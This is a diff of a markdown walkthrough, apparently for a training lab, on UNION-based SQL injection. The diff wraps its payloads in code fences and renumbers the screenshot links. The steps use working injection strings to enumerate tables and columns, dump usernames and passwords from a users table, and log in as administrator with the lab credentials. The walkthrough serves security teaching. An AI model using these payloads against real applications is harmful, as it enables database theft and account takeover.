@@ -53,7 +53,9 @@ We need a clean baseline request for injecting into the `category` parameter.
 
 Payload:
 
+```
 +UNION+SELECT+NULL,NULL--
+```
 
 The response shows:
 
@@ -72,7 +74,9 @@ If the UNION renders successfully, the column count matches. Here, 2 columns = c
 
 Payload:
 
+```
 +UNION+SELECT+'a','b'--
+```
 
 The page renders perfectly.
 
@@ -87,7 +91,9 @@ Both columns accept **string/text**, allowing us to inject usernames/passwords s
 
 Payload:
 
+```
 ' UNION SELECT table_name, NULL FROM information_schema.tables--
+```
 
 We receive a massive list of tables.
 
@@ -104,7 +110,9 @@ The goal is retrieving credentials. The only meaningful table for authentication
 
 Payload:
 
+```
 '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users'--
+```
 
 This gives us:
 
@@ -112,7 +120,7 @@ This gives us:
 * password
 * username
 
-![Step 5](SQLi__PoC/5.png)
+![Step 5](SQLi__PoC/6.png)
 
 ➤ *Why?*
 We now know the two columns we need for the final dump: **username**, **password**.
@@ -123,7 +131,9 @@ We now know the two columns we need for the final dump: **username**, **password
 
 Payload:
 
+```
 '+UNION+SELECT+username,+password+FROM+users--
+```
 
 Response shows:
 
@@ -131,7 +141,7 @@ administrator – fac5uow76djah23ciyho
 carlos – edexxhcvgv52tv9wretc
 wiener – 2i6gxhulbgj02n5cc2k5
 
-![Step 6](SQLi__PoC/6.png)
+![Step 6](SQLi__PoC/7.png)
 
 ➤ *Why?*
 The lab explicitly wants us to extract creds → login as administrator.
@@ -145,7 +155,7 @@ Use:
 username: administrator
 password: fac5uow76djah23ciyho
 
-![Step 7](SQLi__PoC/7.png)
+![Step 7](SQLi__PoC/8.png)
 
 ➤ *Why?*
 Logging in with these credentials finalizes the exploit.
@@ -156,7 +166,7 @@ Logging in with these credentials finalizes the exploit.
 
 Visiting My Account after login confirms the challenge is completed.
 
-![Step 8](SQLi__PoC/8.png)
+![Step 8](SQLi__PoC/9.png)
 
 ---
 
